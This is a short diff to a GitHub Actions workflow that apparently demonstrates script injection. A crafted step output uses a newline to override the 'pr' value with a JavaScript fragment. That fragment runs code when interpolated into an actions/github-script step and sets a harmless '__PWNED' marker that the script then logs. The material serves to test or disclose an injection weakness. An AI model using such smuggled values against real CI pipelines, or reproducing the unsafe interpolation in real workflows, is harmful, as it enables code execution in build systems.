@@ -12,11 +12,7 @@ jobs:
         id: a
         run: |
           printf 'pr=111\n' >> "$GITHUB_OUTPUT"
-          printf 'ci_yaml_only=%s\n' "$(printf '1\npr=111);globalThis.__PWNED=1;((0)')" >> "$GITHUB_OUTPUT"
-      - name: show-output
-        run: |
-          echo "OUTPUT_PR=${{ steps.a.outputs.pr }}"
-          echo "OUTPUT_CI=${{ steps.a.outputs.ci_yaml_only }}"
+          printf 'ci_yaml_only=%s\n' "$(printf '1\npr=0, x:(()=>{globalThis.__PWNED=42;return 0})(), y:0')" >> "$GITHUB_OUTPUT"
       - name: interpolated-js-sink
         uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
         continue-on-error: true
@@ -27,4 +23,4 @@ jobs:
               owner: 'x',
               repo: 'y'
             }
-            core.info('OBJ=' + JSON.stringify(obj))
+            core.info('OBJ=' + JSON.stringify(obj) + ' PWNED=' + globalThis.__PWNED)
